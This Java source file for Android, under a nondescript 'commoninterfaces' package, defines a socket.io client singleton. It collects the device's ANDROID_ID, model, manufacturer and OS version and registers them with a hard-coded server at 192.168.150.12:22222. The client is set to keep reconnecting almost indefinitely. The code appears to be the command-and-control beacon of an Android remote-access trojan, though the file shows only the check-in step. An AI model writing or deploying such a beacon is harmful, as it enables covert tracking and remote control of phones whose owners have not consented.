package com.example.commoninterfaces;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {
    public static Context context;
    private io.socket.client.Socket ioSocket;
    private static IOSocket sInstance;

    public static IOSocket getInstance(Context x) {
        if (sInstance == null) {
            sInstance = new IOSocket(x);
        }

        return sInstance;
    }

    public IOSocket(Context context) {
        IOSocket.context = context;
        try {

            String deviceID = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );

            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;

            ioSocket = IO.socket(
                    "http://192.168.150.12:22222"
                            + "?model=" + android.net.Uri.encode(Build.MODEL)
                            + "&manf=" + Build.MANUFACTURER
                            + "&release=" + Build.VERSION.RELEASE
                            + "&id=" + deviceID
            );
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    public Socket getIoSocket() {
        return ioSocket;
    }
}
